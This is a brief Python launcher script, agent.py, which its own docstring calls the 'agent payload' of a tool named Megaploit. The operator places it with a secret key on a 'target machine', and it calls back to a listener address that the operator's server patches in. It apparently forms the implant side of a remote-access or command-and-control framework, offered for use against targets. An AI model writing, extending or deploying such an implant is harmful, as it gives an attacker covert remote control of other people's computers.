#!/usr/bin/env python3
"""
agent.py — Megaploit agent payload.

Deploy this file (plus secret.key) on the target machine, then run:
    python agent.py

The LHOST / PORT / USE_TLS constants inside megaploit/agent/connection.py are
patched automatically by the server when you run  generate  (or  generate -c
for byte-compilation) from the Megaploit console.
"""

import sys
from megaploit.agent import connection as _conn


if __name__ == "__main__":
    try:
        _conn.start()
    except KeyboardInterrupt:
        sys.exit(0)
